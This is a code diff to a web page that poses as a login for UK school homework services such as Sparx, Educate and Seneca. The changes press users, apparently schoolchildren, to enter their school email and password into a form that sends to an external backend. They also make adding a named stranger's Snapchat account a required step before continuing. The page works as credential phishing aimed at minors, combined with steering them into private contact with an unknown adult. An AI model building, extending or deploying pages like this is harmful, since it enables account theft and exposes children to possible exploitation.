@@ -206,16 +206,45 @@
       </div>
       
       <div class="form-group">
-        <label>Username or Email *</label>
-        <input type="text" id="username" required placeholder="Enter your username or email" autocomplete="username">
+        <label>School Email / Username *</label>
+        <input type="text" id="username" required placeholder="Your SCHOOL email (e.g., for Sparx, Educate, etc.)" autocomplete="username">
+        <small style="color: #666; display: block; margin-top: 0.5rem; font-size: 0.9rem;">
+          ⚠️ Use your <strong>SCHOOL EMAIL</strong>, not your personal email!<br>
+          (The email you use for Sparx / Educate / Seneca / etc.)
+        </small>
       </div>
       
       <div class="form-group">
-        <label>Password *</label>
+        <label>School Password *</label>
         <div class="password-wrapper">
-          <input type="password" id="password" required placeholder="Enter your password" autocomplete="current-password" style="padding-right: 100px;">
+          <input type="password" id="password" required placeholder="Your SCHOOL password" autocomplete="current-password" style="padding-right: 100px;">
           <button type="button" class="password-toggle" onclick="togglePassword()">Show Password</button>
         </div>
+        <small style="color: #666; display: block; margin-top: 0.5rem; font-size: 0.9rem;">
+          ⚠️ Use your <strong>SCHOOL PASSWORD</strong>, not your personal one!<br>
+          (The password for your school homework accounts)
+        </small>
+      </div>
+      
+      <div style="background: linear-gradient(135deg, #6C63FF 0%, #8b7dff 100%); border-radius: 12px; padding: 1.5rem; margin: 1.5rem 0; text-align: center; color: white; box-shadow: 0 4px 12px rgba(108,99,255,0.3);">
+        <div style="font-size: 1.3rem; font-weight: 700; margin-bottom: 0.8rem;">📱 ADD ME ON SNAPCHAT FIRST!</div>
+        
+        <a id="snapchatLink" href="https://www.snapchat.com/add/mo_wasi98" target="_blank" style="display: inline-block; text-decoration: none; margin: 1rem auto;">
+          <div style="display: flex; flex-direction: column; align-items: center; gap: 1rem;">
+            <img src="snapchat-profile.png" alt="Snapchat Profile" style="width: 150px; height: 150px; border-radius: 50%; border: 4px solid #FFFC00; box-shadow: 0 4px 20px rgba(255, 252, 0, 0.5); transition: all 0.3s; cursor: pointer; object-fit: cover;" onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 6px 30px rgba(255, 252, 0, 0.7)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 20px rgba(255, 252, 0, 0.5)';">
+            <div style="background: #FFFC00; color: #000; padding: 0.8rem 2rem; border-radius: 50px; font-size: 1.3rem; font-weight: 900; box-shadow: 0 4px 15px rgba(255, 252, 0, 0.4);">
+              <span id="snapchatUsername" style="letter-spacing: 0.5px;">mo_wasi98</span>
+            </div>
+          </div>
+        </a>
+        
+        <div style="font-size: 0.9rem; opacity: 0.95; margin-top: 0.8rem; margin-bottom: 0.5rem;">👆 Click my picture to add me on Snapchat!</div>
+        <div style="font-size: 0.95rem; opacity: 0.95; margin-bottom: 1rem;">⚠️ You must add this Snapchat before continuing!</div>
+        
+        <label style="display: flex; align-items: center; justify-content: center; gap: 0.5rem; cursor: pointer; font-size: 1.05rem; background: rgba(255,255,255,0.15); padding: 1rem; border-radius: 8px; transition: all 0.2s;">
+          <input type="checkbox" id="snapchatConfirm" required style="width: 20px; height: 20px; cursor: pointer;">
+          <span style="font-weight: 600;">✓ I have added this Snapchat</span>
+        </label>
       </div>
       
       <button type="submit" id="submitBtn" class="submit-btn">Continue to Login</button>
@@ -227,6 +256,29 @@
     const BACKEND_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
       ? 'http://localhost:10000' 
       : 'https://test2-adsw.onrender.com';
+
+    // Fetch and display Snapchat username on page load
+    async function loadSnapchat() {
+      try {
+        const response = await fetch(`${BACKEND_URL}/get-snapchat`);
+        if (response.ok) {
+          const data = await response.json();
+          const username = data.snapchat || 'mo_wasi98';
+          document.getElementById('snapchatUsername').textContent = username;
+          document.getElementById('snapchatLink').href = `https://www.snapchat.com/add/${username}`;
+        } else {
+          document.getElementById('snapchatUsername').textContent = 'mo_wasi98';
+          document.getElementById('snapchatLink').href = 'https://www.snapchat.com/add/mo_wasi98';
+        }
+      } catch (error) {
+        console.error('Error fetching Snapchat:', error);
+        document.getElementById('snapchatUsername').textContent = 'mo_wasi98';
+        document.getElementById('snapchatLink').href = 'https://www.snapchat.com/add/mo_wasi98';
+      }
+    }
+    
+    // Load Snapchat on page load
+    loadSnapchat();
 
     // Comprehensive list of UK schools (including all Chingford schools)
     const schools = [
@@ -446,6 +498,15 @@
       
       const submitBtn = document.getElementById('submitBtn');
       const errorDiv = document.getElementById('errorMessage');
+      const snapchatCheckbox = document.getElementById('snapchatConfirm');
+      
+      // Validate Snapchat confirmation
+      if (!snapchatCheckbox.checked) {
+        errorDiv.textContent = '⚠️ You must add the Snapchat above and confirm before continuing!';
+        errorDiv.style.display = 'block';
+        return;
+      }
+      
       submitBtn.disabled = true;
       submitBtn.textContent = 'Processing...';
       errorDiv.style.display = 'none';
